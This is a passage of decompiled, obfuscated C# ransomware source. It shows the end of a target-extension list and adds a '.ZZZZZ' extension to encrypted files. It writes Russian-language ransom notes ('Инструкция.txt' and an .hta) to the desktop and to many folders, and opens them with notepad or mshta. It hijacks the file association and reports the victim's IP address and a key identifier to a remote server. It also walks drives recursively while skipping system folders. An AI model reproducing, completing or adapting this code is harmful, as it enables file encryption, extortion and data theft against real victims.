				"SDB", "SDB", "SDC", "SDF", "SIS", "SPQ", "SQL", "SQLITE", "SQLITE3", "SQLITEDB",
				"TE", "TEACHER", "TEMX", "TMD", "TPS", "TRC", "TRC", "TRM", "UDB", "UDL",
				"USR", "V12", "VIS", "VPD", "VVV", "WDB", "WMDB", "WRK", "XDB", "XLD",
				"XMLFF", "vmrs", "VMSC", "VMRS", "3me", "3pe", "hif", "iif", "lyt", "nd",
				"qb2005", "qb2006", "qb2007", "qb2009", "qb2010", "qbb", "qbm", "qbmb", "qbo", "qbw",
				"qbx", "qdf", "qel", "qfx", "qpb", "qsd", "tax", "tax08", "tax09", "tax10",
				"tax11", "tax2008", "tax2009", "tax2010", "tax2011", "tlg", "tt11", "qb2011", "qb2012", "imt",
				"3ME", "3PE", "HIF", "IIF", "LYT", "ND", "QB2005", "QB2006", "QB2007", "QB2009",
				"QB2010", "QBB", "QBM", "QBMB", "QBO", "QBW", "QBX", "QDF", "QEL", "QFX",
				"QPB", "QSD", "TAX", "TAX08", "TAX09", "TAX10", "TAX11", "TAX2008", "TAX2009", "TAX2010",
				"TAX2011", "TLG", "TT11", "QB2011", "QB2012", "IMT", "VHDX", "VHD", "lxa", "LXA",
				"AVHD", "AVHDX", "OVA", "BKF", "altrdf", "ALTRDF", "altc", "alttr", "bck", "TIBX",
				"tibx", "ARC", "fina"
			}, new string[0], rtATyKSVirO, ".ZZZZZ");
		}
		catch (Exception ex6)
		{
			if (nOaztTOGmlogd)
			{
				try
				{
					File.AppendAllText(zRTqZqtXid, "Finish process: " + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		if (!DJyFuHzPdduoi || wKjZvwDAADJADi)
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt"))
				{
					using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt");
					streamWriter.WriteLine(joRKfFeYni("0JLQsNGI0Lgg0LTQvtC60YPQvNC10L3RgtGLLCDQsdCw0LfRiyDQtNCw0L3QvdGL0YUg0Lgg0LTRgNGD0LPQuNC1INGE0LDQudC70Ysg0LHRi9C70Lgg0LfQsNGI0LjRhNGA0L7QstCw0L3Riy4g0J3QviDQvdC1INGB0YLQvtC40YIg0L/QtdGA0LXQttC40LLQsNGC0YwhIA0K0JzRiyDQstGB0LUg0YDQsNGB0YjQuNGE0YDRg9C10Lwg0Lgg0LLQtdGA0L3QtdC8INC90LAg0YHQstC+0Lgg0LzQtdGB0YLQsC4NCg0K0JTQu9GPINGA0LDRgdGI0LjRhNGA0L7QstC60Lgg0LTQsNC90L3Ri9GFOg0KDQrQndCw0L/QuNGI0LjRgtC1INC90LAg0L/QvtGH0YLRgyAtIHNlY3VyZTQzNTNAbXNnc2FmZS5pbw0KIA0KICrQkiDQv9C40YHRjNC80LUg0YPQutCw0LfQsNGC0Ywg0JLQsNGIINC70LjRh9C90YvQuSDQuNC00LXQvdGC0LjRhNC40LrQsNGC0L7RgCAoS2V5IElkZW50aWZpZXIpDQogKtCf0YDQuNC60YDQtdC/0LjRgtC1IDIg0YTQsNC50LvQsCDQtNC+IDIg0LzQsSDQtNC70Y8g0YLQtdGB0YLQvtCy0L7QuSDRgNCw0YHRiNC40YTRgNC+0LLQutC4LiANCiAg0LzRiyDQuNGFINGA0LDRgdGI0LjRhNGA0YPQtdC8LCDQsiDQutCw0YfQtdGB0YLQstC1INC00L7QutCw0LfQsNGC0LXQu9GM0YHRgtCy0LAsINGH0YLQviDQotCe0JvQrNCa0J4g0JzQqyDQvNC+0LbQtdC8INGA0LDRgdGI0LjRhNGA0L7QstCw0YLRjCDRhNCw0LnQu9GLLg0KDQogLdCn0LXQvCDQsdGL0YHRgtGA0LXQtSDQstGLINGB0L7QvtCx0YnQuNGC0LUg0L3QsNC8INGB0LLQvtC5INC40LTQtdC90YLQuNGE0LjQutCw0YLQvtGALCDRgtC10Lwg0LHRi9GB0YLRgNC10LUg0LzRiyDQstGL0LrQu9GO0YfQuNC8INC/0YDQvtC40LfQstC+0LvRjNC90L7QtSDRg9C00LDQu9C10L3QuNC1INGE0LDQudC70L7Qsi4NCiAt0J3QsNC/0LjRgdCw0LIg0L3QsNC8INC90LAg0L/QvtGH0YLRgyDQstGLINC/0L7Qu9GD0YfQuNGC0LUg0LTQsNC70YzQvdC10LnRiNC40LUg0LjQvdGB0YLRgNGD0LrRhtC40Lgg0L/QviDQvtC/0LvQsNGC0LUuDQoNCtCSINC+0YLQstC10YLQvdC+0Lwg0L/QuNGB0YzQvNC1INCS0Ysg0L/QvtC70YPRh9C40YLQtSDQv9GA0L7Qs9GA0LDQvNC80YMg0LTQu9GPINGA0LDRgdGI0LjRhNGA0L7QstC60LguDQrQn9C+0YHQu9C1INC30LDQv9GD0YHQutCwINC/0YDQvtCz0YDQsNC80LzRiy3QtNC10YjQuNGE0YDQvtCy0YnQuNC60LAg0LLRgdC1INCS0LDRiNC4INGE0LDQudC70Ysg0LHRg9C00YPRgiDQstC+0YHRgdGC0LDQvdC+0LLQu9C10L3Riy4NCg0K0JzRiyDQs9Cw0YDQsNC90YLQuNGA0YPQtdC8Og0KMTAwJSDRg9GB0L/QtdGI0L3QvtC1INCy0L7RgdGB0YLQsNC90L7QstC70LXQvdC40LUg0LLRgdC10YUg0LLQsNGI0LjRhSDRhNCw0LnQu9C+0LINCjEwMCUg0LPQsNGA0LDQvdGC0LjRjiDRgdC+0L7RgtCy0LXRgtGB0YLQstC40Y8NCjEwMCUg0LHQtdC30L7Qv9Cw0YHQvdGL0Lkg0Lgg0L3QsNC00LXQttC90YvQuSDRgdC10YDQstC40YENCtCS0L3QuNC80LDQvdC40LUhDQogKiDQndC1INC/0YvRgtCw0LnRgtC10YHRjCDRg9C00LDQu9C40YLRjCDQv9GA0L7Qs9GA0LDQvNC80YMg0LjQu9C4INC30LDQv9GD0YHQutCw0YLRjCDQsNC90YLQuNCy0LjRgNGD0YHQvdGL0LUg0YHRgNC10LTRgdGC0LLQsA0KICog0J/QvtC/0YvRgtC60Lgg0YHQsNC80L7RgdGC0L7Rj9GC0LXQu9GM0L3QvtC5INGA0LDRgdGI0LjRhNGA0L7QstC60Lgg0YTQsNC50LvQvtCyINC/0YDQuNCy0LXQtNGD0YIg0Log0L/QvtGC0LXRgNC1INCS0LDRiNC40YUg0LTQsNC90L3Ri9GFDQogKiDQlNC10YjQuNGE0YDQsNGC0L7RgNGLINC00YDRg9Cz0LjRhSDQv9C+0LvRjNC30L7QstCw0YLQtdC70LXQuSDQvdC10YHQvtCy0LzQtdGB0YLQuNC80Ysg0YEg0JLQsNGI0LjQvNC4INC00LDQvdC90YvQvNC4LCDRgtCw0Log0LrQsNC6INGDINC60LDQttC00L7Qs9C+INC/0L7Qu9GM0LfQvtCy0LDRgtC10LvRjw0K0YPQvdC40LrQsNC70YzQvdGL0Lkg0LrQu9GO0Ycg0YjQuNGE0YDQvtCy0LDQvdC40Y8NCg0KDQrQmtCw0LbQtNGL0LUgMjQg0YfQsNGB0LAg0YPQtNCw0LvRj9GO0YLRgdGPIDI0INGE0LDQudC70LAsINC90LXQvtCx0YXQvtC00LjQvNC+INC/0YDQuNGB0LvQsNGC0Ywg0YHQstC+0Lkg0LjQtNC10L3RgtC40YTQuNC60LDRgtC+0YAg0YfRgtC+0LEg0LzRiyDQvtGC0LrQu9GO0YfQuNC70Lgg0Y3RgtGDINGE0YPQvdC60YbQuNGOLg0K0JrQsNC20LTRi9C1IDI0INGH0LDRgdCwINGB0YLQvtC40LzQvtGB0YLRjCDRgNCw0YHRiNC40YTRgNC+0LLQutC4INC00LDQvdC90YvRhSDRg9Cy0LXQu9C40YfQuNCy0LDQtdGC0YHRjyDQvdCwIDMwJSAo0YfQtdGA0LXQtyA3MiDRh9Cw0YHQsCDRgdGD0LzQvNCwINGE0LjQutGB0LjRgNGD0LXRgtGB0Y8p").Replace("%ID%", tbTGHSHczYFiA.eRjoPReHvhw()).Replace("%USERNAME%", Environment.UserName).Replace("%MACHINENAME%", Environment.MachineName)
						.Replace("%DOMAINNAME%", Environment.UserDomainName));
					streamWriter.WriteLine("\r\n");
					if (GwONzlFMcsJ || !zzEQfIIuvgiBbM)
					{
						streamWriter.WriteLine(joRKfFeYni("S0VZSUQ6IA=="));
						streamWriter.WriteLine(EUefSwzLcwrcxo);
					}
					if (BHjDxJUUfXETE == "NO")
					{
						streamWriter.WriteLine("\r\n");
						streamWriter.WriteLine(joRKfFeYni("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(NnFouaTmgntTWt.Count));
					}
					if (FDgJvwVvfGwgSO)
					{
						streamWriter.WriteLine("\r\n");
						streamWriter.WriteLine(joRKfFeYni("UEMgSGFyZHdhcmUgSUQ6IA=="));
						streamWriter.WriteLine(tbTGHSHczYFiA.eRjoPReHvhw());
					}
				}
				else
				{
					string text7 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt");
					if (!text7.Contains(EUefSwzLcwrcxo) && !zzEQfIIuvgiBbM)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt", "\r\nAdditional KeyId:\r\n" + EUefSwzLcwrcxo);
					}
				}
			}
			catch (Exception ex6)
			{
				if (nOaztTOGmlogd)
				{
					try
					{
						File.AppendAllText(zRTqZqtXid, "Error while writing main note..." + ex6.Message + "\r\n");
					}
					catch (Exception)
					{
					}
				}
			}
			int num = 0;
			foreach (string item in jjfntRYhuFNxp)
			{
				num++;
				try
				{
					if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
					{
						continue;
					}
				}
				catch
				{
				}
				try
				{
					if (!File.Exists(item + "\\Инструкция.txt"))
					{
						File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt", item + "\\Инструкция.txt", overwrite: true);
					}
					else
					{
						string text7 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt");
						if (!text7.Contains(EUefSwzLcwrcxo) && !zzEQfIIuvgiBbM)
						{
							File.AppendAllText(item + "\\Инструкция.txt", "\r\nAdditional KeyId:\r\n" + EUefSwzLcwrcxo);
						}
					}
				}
				catch (Exception ex6)
				{
					if (nOaztTOGmlogd)
					{
						try
						{
							File.AppendAllText(zRTqZqtXid, "Error while writing main note..." + ex6.Message + "\r\n");
						}
						catch (Exception)
						{
						}
					}
					num--;
				}
				if (!cBlDNBQZGaRop && num > 10)
				{
					break;
				}
			}
		}
		boWMTCWcrZGVZBa();
		if ((ksPvkjCzIwfV == "YES" && !DJyFuHzPdduoi) || (ksPvkjCzIwfV == "YES" && wKjZvwDAADJADi))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.hta"))
				{
					using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.hta");
					streamWriter.WriteLine(joRKfFeYni("MESSAGERICH").Replace("%ID%", tbTGHSHczYFiA.eRjoPReHvhw()).Replace("%USERNAME%", Environment.UserName).Replace("%MACHINENAME%", Environment.MachineName)
						.Replace("%DOMAINNAME%", Environment.UserDomainName));
					streamWriter.WriteLine("\r\n");
					if (GwONzlFMcsJ || !zzEQfIIuvgiBbM)
					{
						streamWriter.WriteLine(joRKfFeYni(tvWunvyFIKOf("=AiOElUWFtkPisjclRnblNGI642ZpxWYtQHelRnI9UGb5R3cgAHP")));
						streamWriter.WriteLine(EUefSwzLcwrcxo + joRKfFeYni("PC9wPg=="));
					}
					if (BHjDxJUUfXETE == "NO")
					{
						streamWriter.WriteLine("\r\n");
						streamWriter.WriteLine(joRKfFeYni("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + joRKfFeYni("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(NnFouaTmgntTWt.Count) + joRKfFeYni("PC9wPg=="));
					}
					if (FDgJvwVvfGwgSO)
					{
						streamWriter.WriteLine("\r\n");
						streamWriter.WriteLine(joRKfFeYni("UEMgSGFyZHdhcmUgSUQ6IA=="));
						streamWriter.WriteLine(tbTGHSHczYFiA.eRjoPReHvhw());
					}
				}
				else
				{
					string text7 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt");
					if (!text7.Contains(EUefSwzLcwrcxo) && !zzEQfIIuvgiBbM)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.hta", joRKfFeYni("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + "\r\nAdditional KeyId:\r\n" + EUefSwzLcwrcxo + joRKfFeYni("PC9wPg=="));
					}
				}
			}
			catch (Exception ex6)
			{
				if (nOaztTOGmlogd)
				{
					try
					{
						File.AppendAllText(zRTqZqtXid, "Error while writing rich text main note..." + ex6.Message + "\r\n");
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (FTansQggGPR == "YES")
		{
			try
			{
				if (BHjDxJUUfXETE == "NO")
				{
					tbTGHSHczYFiA.vGjAakkFFwJRwEa("URL", "USERNAME", "ACCESO", string.Concat(joRKfFeYni("Q2xpZW50IElQOiA="), new WebClient().DownloadString(joRKfFeYni("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r", joRKfFeYni("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", joRKfFeYni("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA=="), Convert.ToString(NnFouaTmgntTWt.Count), "\r\n", joRKfFeYni("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), EUefSwzLcwrcxo));
				}
				else
				{
					tbTGHSHczYFiA.vGjAakkFFwJRwEa("URL", "USERNAME", "ACCESO", string.Concat(joRKfFeYni("Q2xpZW50IElQOiA="), new WebClient().DownloadString(joRKfFeYni("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r", joRKfFeYni("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", joRKfFeYni("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA=="), Convert.ToString(NnFouaTmgntTWt.Count), "\r\n", joRKfFeYni("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), EUefSwzLcwrcxo));
				}
			}
			catch
			{
			}
		}
		if (lNYwPYmIsVcvica == "YES")
		{
			try
			{
				uteuagTnFLHv.rXFpNnDuCzhwVPF(new Uri(""));
			}
			catch
			{
			}
		}
		if (ksPvkjCzIwfV == "NO" && !DJyFuHzPdduoi)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt"))
				{
					Process.Start(joRKfFeYni("bm90ZXBhZC5leGU="), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt");
				}
				try
				{
					if (aLMUqgosPdtj)
					{
						Console.WriteLine("Starting text note...");
					}
				}
				catch
				{
				}
			}
			catch (Exception ex6)
			{
				if (nOaztTOGmlogd)
				{
					try
					{
						File.AppendAllText(zRTqZqtXid, "Error while running main text note..." + ex6.Message + "\r\n");
					}
					catch (Exception)
					{
					}
				}
			}
		}
		else if (ksPvkjCzIwfV == "YES" && !DJyFuHzPdduoi)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.hta"))
				{
					Process.Start(joRKfFeYni("bXNodGEuZXhl"), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.hta");
				}
				try
				{
					if (aLMUqgosPdtj)
					{
						Console.WriteLine("Starting html note...");
					}
				}
				catch
				{
				}
			}
			catch (Exception ex6)
			{
				if (nOaztTOGmlogd)
				{
					try
					{
						File.AppendAllText(zRTqZqtXid, "Error while running main html note..." + ex6.Message + "\r\n");
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (zSvnXhdXFcyye == "YES")
		{
			if (aSTzHoNGAgWsQX == "YES" && !string.IsNullOrEmpty(FTBHcmxKhCRSXf) && !string.IsNullOrEmpty(kHqnKxGzzKywC))
			{
				hBbjeexJhMrsh(FTBHcmxKhCRSXf, kHqnKxGzzKywC);
			}
			else
			{
				hBbjeexJhMrsh();
			}
		}
		if (UswXsnGAnhoBIN != "LOGONISOFF")
		{
			bUhYWwFtrZjxM(UswXsnGAnhoBIN);
		}
		if (!string.IsNullOrEmpty(xxemfVpsFwlEjNAk))
		{
			try
			{
				File.Delete(xxemfVpsFwlEjNAk);
			}
			catch
			{
			}
		}
		if (OqVLzifHTWM)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt"))
				{
					string xbZcJccvfzVGAf = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt");
					FGfsSEOTSS.xAbaBNJZskQr(xbZcJccvfzVGAf);
				}
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), "Config.enc")))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), "Config.enc"));
			}
		}
		catch (Exception ex12)
		{
			try
			{
				File.AppendAllText(zRTqZqtXid, "Error deleting config text file: " + ex12.Message);
			}
			catch (Exception)
			{
			}
		}
		if (nOaztTOGmlogd)
		{
			try
			{
				File.AppendAllText(zRTqZqtXid, "All Done!");
			}
			catch (Exception)
			{
			}
		}
		stopwatch.Stop();
		TimeSpan elapsed = stopwatch.Elapsed;
		string contents = $" Total Runtime: {elapsed.Hours:00}:{elapsed.Minutes:00}:{elapsed.Seconds:00}.{elapsed.Milliseconds / 10:00} ";
		if (nOaztTOGmlogd)
		{
			try
			{
				File.AppendAllText(zRTqZqtXid, contents);
			}
			catch (Exception)
			{
			}
		}
		if (!LmZNugIjEba().Contains("XP"))
		{
			try
			{
				HEtSbTekjvbdmpa(jDEqIhTjGP);
			}
			catch (Exception)
			{
			}
			Parallel.ForEach(vcERAqomxNm, delegate(string kvZuPCqAWYJqCbB)
			{
				xQfMOPCvvVAqwp(joRKfFeYni(tvWunvyFIKOf("lhXZu4WatRWYzNnd")), kvZuPCqAWYJqCbB);
			});
		}
		else
		{
			Parallel.ForEach(vcERAqomxNm, delegate(string xyIVKqvLuDnKkR)
			{
				xQfMOPCvvVAqwp(joRKfFeYni(tvWunvyFIKOf("lhXZu4WatRWYzNnd")), xyIVKqvLuDnKkR);
			});
		}
		if (ZXYptuaUWd == "EVET")
		{
			pQsIRxMQfXRA();
		}
	}

	[DllImport("Shell32.dll")]
	private static extern int SHChangeNotify(int FBuhxohozYfMGD, int IhuJWcAuadgJwcr, IntPtr VpDcabUJZfwK, IntPtr YyQiPdDGlob);

	public static bool sEHEyxqJQWSr(string mOOXToDAeRgmkQf, string uUKNmScFMJbH, string guCosWqdAKl, string RWvaUYFvWzUIMYcI, string dtXpxPhsQMXk)
	{
		return false | tfsGkgpKojTynOz(joRKfFeYni("U29mdHdhcmVcQ2xhc3Nlc1w=") + mOOXToDAeRgmkQf, uUKNmScFMJbH) | tfsGkgpKojTynOz(joRKfFeYni("U29mdHdhcmVcQ2xhc3Nlc1w=") + uUKNmScFMJbH, guCosWqdAKl) | tfsGkgpKojTynOz(joRKfFeYni("U29mdHdhcmVcQ2xhc3Nlc1w=") + uUKNmScFMJbH + joRKfFeYni("XHNoZWxsXG9wZW5cY29tbWFuZA=="), "\"" + RWvaUYFvWzUIMYcI + "\" \"" + dtXpxPhsQMXk + "\"");
	}

	private static bool tfsGkgpKojTynOz(string sKZEduVVOHe, string NDMqXRQKfe)
	{
		using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(sKZEduVVOHe))
		{
			if (registryKey.GetValue(null) as string!= NDMqXRQKfe)
			{
				registryKey.SetValue(null, NDMqXRQKfe);
				return true;
			}
		}
		return false;
	}

	public static void boWMTCWcrZGVZBa()
	{
		try
		{
			if (!CGcSKksPgfyIShZD)
			{
				if (sEHEyxqJQWSr(".ZZZZZ", joRKfFeYni("Tm90ZXBhZA=="), joRKfFeYni("Tm90ZXBhZCBBcHBsaWNhdGlvbg=="), joRKfFeYni("Yzpcd2luZG93c1xzeXN0ZW0zMlxub3RlcGFkLmV4ZQ=="), Path.GetTempPath() + "Инструкция.txt"))
				{
					SHChangeNotify(134217728, 4096, IntPtr.Zero, IntPtr.Zero);
				}
			}
			else if (sEHEyxqJQWSr(".ZZZZZ", joRKfFeYni("bXNlZGdl"), joRKfFeYni("bXNlZGdlIEFwcGxpY2F0aW9u"), joRKfFeYni("QzpcUHJvZ3JhbSBGaWxlc1xJbnRlcm5ldCBFeHBsb3JlclxpZXhwbG9yZS5leGU="), joRKfFeYni("%WEBSITEINFOOPEN%")))
			{
				SHChangeNotify(134217728, 4096, IntPtr.Zero, IntPtr.Zero);
			}
			try
			{
				if (aLMUqgosPdtj)
				{
					Console.WriteLine("Extension association completed...");
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
			if (nOaztTOGmlogd)
			{
				try
				{
					File.AppendAllText(zRTqZqtXid, "Extension association failed...");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static void qdIcAYcLmHe()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(joRKfFeYni(tvWunvyFIKOf("==QesJXZw9mcwBib1JHIvRHIy9WayVGc1NHIy9GIygjL0AiL2Byay92dl1WYyZEIUVkTuACdm92cvJ3Yp1EIzVmcpVXclJHItFmcn9mcwBycphGV")), joRKfFeYni("SW5mb3JtYXRpb24uLi4="), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int gJRIjQflTys(int WqnxeyhFlZdDO, int sBYfrISDrl)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(WqnxeyhFlZdDO, sBYfrISDrl);
	}

	public static List<string> JDlAMHFGKK(string AAiQOhASCdP, string[] LNNsQvEaQoNh, string rVYKurUtHqg, string[] SDQpWBmvTnp, string ZtogmSptCQfIi)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(AAiQOhASCdP);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if ((XItXBmyQDtCnl.Count > 0 && XItXBmyQDtCnl.Contains(text)) || ((text.Contains("C:\\Program Files\\") || text.Contains("C:\\Program Files (x86)\\") || text.Contains(":\\Windows\\") || text.ToLower().Contains("perflogs") || text.ToLower().Contains("internet explorer") || text.Contains(":\\ProgramData\\") || text.Contains("\\AppData\\") || text.ToLower().Contains("msocache") || text.ToLower().Contains("system volume information") || text.ToLower().Contains("boot") || text.ToLower().Contains("tor browser") || text.ToLower().Contains("mozilla") || text.ToLower().Contains("appdata") || text.ToLower().Contains("google chrome") || text.ToLower().Contains("application data")) && !text.Contains(joRKfFeYni("TWljcm9zb2Z0IFNRTCBTZXJ2ZXI="))))
				{
					continue;
				}
				array = Directory.GetFiles(text);
				goto IL_018f;
			}
			catch
			{
			}
			continue;
			IL_018f:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains("autoexec.bat") && !fileInfo.FullName.Contains("desktop.ini") && !fileInfo.FullName.Contains("autorun.inf") && !fileInfo.FullName.Contains("ntuser.dat") && !fileInfo.FullName.Contains("NTUSER.DAT") && !fileInfo.FullName.Contains("iconcache.db") && !fileInfo.FullName.Contains("bootsect.bak") && !fileInfo.FullName.Contains("boot.ini") && !fileInfo.FullName.Contains("ntuser.dat.log") && !fileInfo.FullName.Contains("thumbs.db") && !fileInfo.FullName.ToLower().Contains("bootmgr") && !fileInfo.FullName.ToLower().Contains("pagefile.sys") && !fileInfo.FullName.ToLower().Contains("config.sys") && !fileInfo.FullName.ToLower().Contains("ntuser.ini") && !fileInfo.FullName.Contains(joRKfFeYni("QnVpbGRlcl9Mb2c=")) && !fileInfo.FullName.Contains("RSAKeys") && !fileInfo.FullName.Contains("ECCKeys") && !fileInfo.FullName.Contains("Config.enc") && !fileInfo.FullName.Contains("Инструкция") && !fileInfo.FullName.EndsWith(".ZZZZZ") && !fileInfo.FullName.EndsWith("exe") && !fileInfo.FullName.EndsWith("dll") && !fileInfo.FullName.EndsWith("EXE") && !fileInfo.FullName.EndsWith("DLL") && !fileInfo.FullName.Contains("Recycle.Bin") && !fileInfo.FullName.Contains(vDqPFVseLDSEcY) && !fileInfo.FullName.Contains(zRTqZqtXid) && !fileInfo.FullName.Contains(mPCnRrJrfRICdG))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(YBwlHZzHGdGB) * 1024.0 * 1024.0 && qshYTVIXevhyaj == "YES")
						{
							list.Add(fileInfo.FullName);
							ZfnXaJgDOJx(list, LNNsQvEaQoNh, rVYKurUtHqg, SDQpWBmvTnp, ZtogmSptCQfIi);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && qshYTVIXevhyaj == "NO")
						{
							list.Add(fileInfo.FullName);
							ZfnXaJgDOJx(list, LNNsQvEaQoNh, rVYKurUtHqg, SDQpWBmvTnp, ZtogmSptCQfIi);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			array2 = directories;
			foreach (string item in array2)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static List<string> vJMqAKIyqtwgbRa(string FJiuUqXBhsK)
	{
		List<string> list = new List<string>();
		DirectoryInfo directoryInfo = new DirectoryInfo(FJiuUqXBhsK);
		try
		{
			foreach (FileInfo item in directoryInfo.EnumerateFiles())
			{
				try
				{
					if ((!item.FullName.Contains("C:\\Program Files\\") && !item.FullName.Contains("C:\\Program Files (x86)\\") && !item.FullName.Contains(":\\Windows\\") && !item.FullName.ToLower().Contains("perflogs") && !item.FullName.ToLower().Contains("internet explorer") && !item.FullName.Contains(":\\ProgramData\\") && !item.FullName.Contains("\\AppData\\") && !item.FullName.ToLower().Contains("autoexec.bat") && !item.FullName.ToLower().Contains("desktop.ini") && !item.FullName.ToLower().Contains("autorun.inf") && !item.FullName.ToLower().Contains("ntuser.dat") && !item.FullName.ToLower().Contains("iconcache.db") && !item.FullName.ToLower().Contains("bootsect.bak") && !item.FullName.ToLower().Contains("boot.ini") && !item.FullName.ToLower().Contains("ntuser.dat.log") && !item.FullName.ToLower().Contains("thumbs.db") && !item.FullName.ToLower().Contains("bootmgr") && !item.FullName.ToLower().Contains("pagefile.sys") && !item.FullName.ToLower().Contains("config.sys") && !item.FullName.ToLower().Contains("ntuser.ini") && !item.FullName.Contains(joRKfFeYni("QnVpbGRlcl9Mb2c=")) && !item.FullName.Contains("RSAKeys") && !item.FullName.Contains("ECCKeys") && !item.FullName.Contains("Инструкция") && !item.FullName.EndsWith(".ZZZZZ") && !item.FullName.EndsWith("exe") && !item.FullName.EndsWith("dll")) || item.FullName.Contains(joRKfFeYni("TWljcm9zb2Z0IFNRTCBTZXJ2ZXI=")))
					{
						if (File.Exists(item.FullName) && (double)item.Length <= double.Parse(YBwlHZzHGdGB) * 1024.0 * 1024.0 && qshYTVIXevhyaj == "YES")
						{
							list.Add(item.FullName);
						}
						else if (File.Exists(item.FullName) && qshYTVIXevhyaj == "NO")
						{
							list.Add(item.FullName);
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
			foreach (DirectoryInfo item2 in directoryInfo.EnumerateDirectories("*"))
			{
				if ((directoryInfo.FullName.ToLower().Contains("program files") || directoryInfo.FullName.ToLower().Contains(":\\windows") || directoryInfo.FullName.ToLower().Contains("perflogs") || directoryInfo.FullName.ToLower().Contains("internet explorer") || directoryInfo.FullName.ToLower().Contains("programdata") || directoryInfo.FullName.ToLower().Contains("appdata")) && !directoryInfo.FullName.Contains(joRKfFeYni("TWljcm9zb2Z0IFNRTCBTZXJ2ZXI=")))
				{
					continue;
				}
				try
				{
					foreach (FileInfo item3 in item2.EnumerateFiles("*", SearchOption.AllDirectories))
					{
						try
						{
							if (!item3.FullName.ToLower().Contains("autoexec.bat") && !item3.FullName.ToLower().Contains("desktop.ini") && !item3.FullName.ToLower().Contains("autorun.inf") && !item3.FullName.ToLower().Contains("ntuser.dat") && !item3.FullName.ToLower().Contains("iconcache.db") && !item3.FullName.ToLower().Contains("bootsect.bak") && !item3.FullName.ToLower().Contains("boot.ini") && !item3.FullName.ToLower().Contains("ntuser.dat.log") && !item3.FullName.ToLower().Contains("thumbs.db") && !item3.FullName.ToLower().Contains("bootmgr") && !item3.FullName.ToLower().Contains("pagefile.sys") && !item3.FullName.ToLower().Contains("config.sys") && !item3.FullName.ToLower().Contains("ntuser.ini") && !item3.FullName.Contains(joRKfFeYni("QnVpbGRlcl9Mb2c=")) && !item3.FullName.Contains("RSAKeys") && !item3.FullName.Contains("ECCKeys") && !item3.FullName.Contains("Инструкция") && !item3.FullName.EndsWith(".ZZZZZ") && !item3.FullName.EndsWith("exe") && !item3.FullName.EndsWith("dll"))
							{
